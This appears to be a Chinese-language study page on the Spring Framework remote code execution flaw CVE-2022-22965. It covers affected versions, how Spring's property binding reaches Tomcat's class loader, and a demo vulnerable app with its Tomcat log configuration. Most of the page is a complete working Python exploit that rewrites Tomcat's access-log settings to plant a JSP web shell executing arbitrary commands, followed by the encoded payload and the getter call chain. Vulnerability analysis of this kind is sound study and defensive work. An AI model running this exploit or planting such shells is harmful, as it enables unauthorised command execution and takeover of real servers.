<template><div><h1 id="cve-2022-22965-spring-rce" tabindex="-1"><a class="header-anchor" href="#cve-2022-22965-spring-rce" aria-hidden="true">#</a> CVE-2022-22965-Spring-RCE</h1>
<blockquote>
<p><a href="https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement" target="_blank" rel="noopener noreferrer">https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement<ExternalLinkIcon/></a></p>
</blockquote>
<blockquote>
<p>受影响范围：</p>
<ul>
<li><code v-pre>Spring Framework &lt; 5.3.18</code></li>
<li><code v-pre>Spring Framework &lt; 5.2.20</code></li>
<li><code v-pre>JDK ≥ 9</code></li>
<li><code v-pre>Tomcat 8.5.77</code>、 <code v-pre>Tomcat 9.0.60</code> 等（<code v-pre>JDK 9</code> 以上和 部分<code v-pre>Tomcat</code> 版本组合的情况下）</li>
</ul>
</blockquote>
<p><code v-pre>java.bean.PropertyDescriptor</code></p>
<p>通过反射机制调用 <code v-pre>get/set</code> 方法</p>
<p>Spring 中 BeanWrapperImpl 用 setPropertyValue 和 getPropertyValue 获取和修改对象的属性</p>
<p>BeanWrapperImlp 对 spring 容器中管理的对象自动调用 get/set 方法</p>
<p>BeanWrapperImpl  进一步封装了 PropertyDescriptor</p>
<p>思路：</p>
<p>只要能获取到路径，就可以通过这个路径，使用 Spring 参数自动绑定，修改 Spring工程里面的任意对象的任意属性</p>
<p>修改，Tomcat 日志的保存路径、文件名、内容，写入 webshell</p>
<div class="language-java line-numbers-mode" data-ext="java"><pre v-pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">Department</span> department<span class="token punctuation">;</span>
    
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setNmae</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token class-name">Department</span> <span class="token function">getDepartment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> department<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDepartment</span><span class="token punctuation">(</span><span class="token class-name">Department</span> department<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>department <span class="token operator">=</span> department<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-java line-numbers-mode" data-ext="java"><pre v-pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Department</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setNmae</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-java line-numbers-mode" data-ext="java"><pre v-pre class="language-java"><code><span class="token annotation punctuation">@Controller</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserController</span><span class="token punctuation">{</span>
    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/addUser"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">addUser</span><span class="token punctuation">(</span><span class="token annotation punctuation">@ResponseBody</span> <span class="token class-name">User</span> user<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token string">"OK"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Tomcat 的日志文件： <code v-pre>tomcat</code> 根目录 / log 目录下</p>
<ul>
<li>catalina.xxxxx   启动日志</li>
<li>host-manager.xxxx</li>
<li>xxxx.access.xxxxx   http 接口访问日志，就是访问接口时的日志</li>
<li>manager.xxxxx   tomcat 管理界面日志</li>
</ul>
<p>实现</p>
<p>通过 /addUser 接口的参数 User 对象的自动绑定，改变 Tomcat 的日志路径和内容</p>
<p>tomcat 的日志配置在 conf /server.xml 中</p>
<ul>
<li>directory: access_log 文件的输出目录</li>
<li>prefix： access_log 文件名前缀</li>
<li>suffix： access_log 文件名后缀</li>
<li>pattern： access_log 文件内容格式</li>
<li>fileDateFormat： access_log 文件名日期后缀，默认 yyyy-MM-dd</li>
</ul>
<div class="language-xml line-numbers-mode" data-ext="xml"><pre v-pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Server</span><span class="token punctuation">></span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Service</span><span class="token punctuation">></span></span>
    	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Engine</span><span class="token punctuation">></span></span>
    		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Host</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Value</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.apache.catalina.values.AccessLogValue<span class="token punctuation">"</span></span> 
                       <span class="token attr-name">directory</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logs<span class="token punctuation">"</span></span> 
                       <span class="token attr-name">prefix</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>localhost_access_log<span class="token punctuation">"</span></span> 
                       <span class="token attr-name">suffix</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>.txt<span class="token punctuation">"</span></span> 
                       <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%h %l %u %t <span class="token entity named-entity" title="&quot;">&amp;quot;</span> %r<span class="token entity named-entity" title="&quot;">&amp;quot;</span> %s %b<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
        	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Host</span><span class="token punctuation">></span></span>
    	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Engine</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Service</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Server</span><span class="token punctuation">></span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>修改 SpringBoot 的启动类（默认在内置的 tomcat 中启动，要在指定 tomcat 中启动需要继承 SpringBootServletInitializer</p>
<div class="language-java line-numbers-mode" data-ext="java"><pre v-pre class="language-java"><code><span class="token annotation punctuation">@SpringBootApplication</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ApplicationMain</span> <span class="token keyword">extends</span> <span class="token class-name">SpringBootServletInitializer</span> <span class="token punctuation">{</span>
    
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">ApplicationMain</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token class-name">SpringApplicationBuilder</span> <span class="token function">configure</span><span class="token punctuation">(</span><span class="token class-name">SpringApplicationBuilder</span> builder<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> builder<span class="token punctuation">.</span><span class="token function">sources</span><span class="token punctuation">(</span><span class="token class-name">ApplicationMain</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>复现环境：</p>
<ul>
<li>JDK 11.0.11</li>
<li>Tomcat 9.0.60</li>
<li>SpringBoot 2.6.3</li>
<li>上面的代码打包 war 包放在 tomcat/webapps 下</li>
</ul>
<p>利用：</p>
<p><code v-pre>exploit.py --url http://localhost:8080/addUser</code></p>
<div class="language-python line-numbers-mode" data-ext="py"><pre v-pre class="language-python"><code><span class="token keyword">import</span> requests
<span class="token keyword">import</span> argparse
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse
<span class="token keyword">import</span> time
 
<span class="token comment"># Set to bypass errors if the target site has SSL issues</span>
requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
post_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span>
<span class="token punctuation">}</span>
 
get_headers <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"prefix"</span><span class="token punctuation">:</span> <span class="token string">"&lt;%"</span><span class="token punctuation">,</span>
    <span class="token string">"suffix"</span><span class="token punctuation">:</span> <span class="token string">"%>//"</span><span class="token punctuation">,</span>
    <span class="token comment"># This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern</span>
    <span class="token string">"c"</span><span class="token punctuation">:</span> <span class="token string">"Runtime"</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>
 
 
<span class="token keyword">def</span> <span class="token function">run_exploit</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> directory<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
    log_pattern <span class="token operator">=</span> <span class="token string">"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20"</span> \
                  <span class="token string-interpolation"><span class="token string">f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter"</span></span> \
                  <span class="token string-interpolation"><span class="token string">f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B"</span></span> \
                  <span class="token string-interpolation"><span class="token string">f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di"</span></span>
 
    log_file_suffix <span class="token operator">=</span> <span class="token string">"class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp"</span>
    log_file_dir <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"class.module.classLoader.resources.context.parent.pipeline.first.directory=</span><span class="token interpolation"><span class="token punctuation">{</span>directory<span class="token punctuation">}</span></span><span class="token string">"</span></span>
    log_file_prefix <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"class.module.classLoader.resources.context.parent.pipeline.first.prefix=</span><span class="token interpolation"><span class="token punctuation">{</span>filename<span class="token punctuation">}</span></span><span class="token string">"</span></span>
    log_file_date_format <span class="token operator">=</span> <span class="token string">"class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="</span>
 
    exp_data <span class="token operator">=</span> <span class="token string">"&amp;"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>log_pattern<span class="token punctuation">,</span> log_file_suffix<span class="token punctuation">,</span> log_file_dir<span class="token punctuation">,</span> log_file_prefix<span class="token punctuation">,</span> log_file_date_format<span class="token punctuation">]</span><span class="token punctuation">)</span>
 
    <span class="token comment"># Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times</span>
    <span class="token comment"># If re-running the exploit, this will create an artifact of {old_file_name}_.jsp</span>
    file_date_data <span class="token operator">=</span> <span class="token string">"class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Resetting Log Variables."</span><span class="token punctuation">)</span>
    ret <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>post_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>file_date_data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Response code: %d"</span> <span class="token operator">%</span> ret<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
 
    <span class="token comment"># Change the tomcat log location variables</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Modifying Log Configurations"</span><span class="token punctuation">)</span>
    ret <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>post_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>exp_data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Response code: %d"</span> <span class="token operator">%</span> ret<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
 
    <span class="token comment"># Changes take some time to populate on tomcat</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
 
    <span class="token comment"># Send the packet that writes the web shell</span>
    ret <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>get_headers<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Response Code: %d"</span> <span class="token operator">%</span> ret<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
 
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 
    <span class="token comment"># Reset the pattern to prevent future writes into the file</span>
    pattern_data <span class="token operator">=</span> <span class="token string">"class.module.classLoader.resources.context.parent.pipeline.first.pattern="</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Resetting Log Variables."</span><span class="token punctuation">)</span>
    ret <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>post_headers<span class="token punctuation">,</span> data<span class="token operator">=</span>pattern_data<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Response code: %d"</span> <span class="token operator">%</span> ret<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>
 
 
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">'Spring Core RCE'</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--url'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'target url'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--file'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'File to write to [no extension]'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"wuya"</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--dir'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'Directory to write to. Suggest using "webapps/[appname]" of target app'</span><span class="token punctuation">,</span>
                        required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"webapps/ROOT"</span><span class="token punctuation">)</span>
 
    file_arg <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">file</span>
    dir_arg <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">dir</span>
    url_arg <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>url
 
    filename <span class="token operator">=</span> file_arg<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">".jsp"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
 
    <span class="token keyword">if</span> url_arg <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Must pass an option for --url"</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
 
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        run_exploit<span class="token punctuation">(</span>url_arg<span class="token punctuation">,</span> dir_arg<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Exploit completed"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Check your target for a shell"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] File: "</span> <span class="token operator">+</span> filename <span class="token operator">+</span> <span class="token string">".jsp"</span><span class="token punctuation">)</span>
 
        <span class="token keyword">if</span> dir_arg<span class="token punctuation">:</span>
            location <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url_arg<span class="token punctuation">)</span><span class="token punctuation">.</span>scheme <span class="token operator">+</span> <span class="token string">"://"</span> <span class="token operator">+</span> urlparse<span class="token punctuation">(</span>url_arg<span class="token punctuation">)</span><span class="token punctuation">.</span>netloc <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> filename <span class="token operator">+</span> <span class="token string">".jsp"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            location <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"Unknown. Custom directory used. (try app/</span><span class="token interpolation"><span class="token punctuation">{</span>filename<span class="token punctuation">}</span></span><span class="token string">.jsp?cmd=whoami"</span></span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] Shell should be at: </span><span class="token interpolation"><span class="token punctuation">{</span>location<span class="token punctuation">}</span></span><span class="token string">?cmd=whoami"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
 
 
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre v-pre class="language-text"><code>class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20" \
                  f"java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter" \
                  f"(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B" \
                  f"%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code v-pre>class.module.classLoader.resources.context.parent.pipeline.first.pattern</code></p>
<p><code v-pre>getClass</code></p>
<p>​	<code v-pre>getModule</code></p>
<p>​		<code v-pre>getClassLoader</code></p>
<p>​			...</p>
<p>​				<code v-pre>getFirst</code></p>
<p>​					<code v-pre>setPattern</code></p>
<p>调用链</p>
<p>User.getClass()</p>
<p>java.lang.Class.getModule()</p>
<p>java.lang.Module.getClassLoader()</p>
<p>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</p>
<p>org.apache.catalina.webresources.StandardRoot.getContext()</p>
<p>org.apache.catalina.core.StandardContext.getParent()</p>
<p>org.apache.catalina.core.StandardHost.getPipeline()</p>
<p>org.apache.catalina.core.StandardPipeline.getFirst()</p>
<p>org.apache.catalina.values.AccessLogValue.setPattern()</p>
<p>漏洞的关键就在于，BeanWrapperImpl 中缓存了 class 属性！！</p>
</div></template>


